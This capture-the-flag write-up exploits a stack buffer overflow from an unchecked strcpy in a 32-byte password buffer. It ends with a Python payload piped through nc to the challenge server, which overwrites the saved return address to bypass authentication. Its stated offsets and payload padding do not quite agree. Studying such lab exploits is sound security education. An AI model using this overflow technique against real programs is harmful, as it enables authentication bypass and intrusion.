# Challenge `Super Secure System` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow (Return Address Overwrite with Register Preservation)
- Where: Where is the vulnerability present
  - The vulnerability is in `check_password`:
```c
int check_password(char* password) {
  char buffer[32];
  strcpy(buffer, password);
  ...
}
```
- buffer is only 32 bytes long
- password can be up to 63 bytes
- strcpy() performs no length checking

This allows overwriting the stack frame of check_password.
- Impact: What results of exploiting this vulnerability
  - Overwrite the saved return address of check_password
  - Redirect execution to bypass authentication logic
  - Force the program to print the flag
  - Exploit the binary without knowing the password

## Steps to reproduce

1. Identify overflow size
    - buffer size: 32 bytes
    - Offset to saved ebx: 32 bytes
    - Offset to saved ebp: 36 bytes
    - Offset to saved eip: 40 bytes
2. Choosing safe values
- The `ebx` must point to valid global memory so the safe choice is in .data section address. Example: `0x0804a03c`
- The `ebp` must be a valid stack address so the safe choice: any stack-like value (observed in GDB) Example: `0x080487d9`
- Teh `eip` jump to an instruction after check_password() is called to bypasses the if condition entirely. In this case the best is `0x080487d9`
3. Payload construction with little-endian encoding:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25155
import sys; sys.stdout.buffer.write(b'A' * 36 + b'\x3c\xa0\x04\x08' + b'\xd9\x87\x04\x08' + b'\xd9\x87\x04\x08')
EOF
```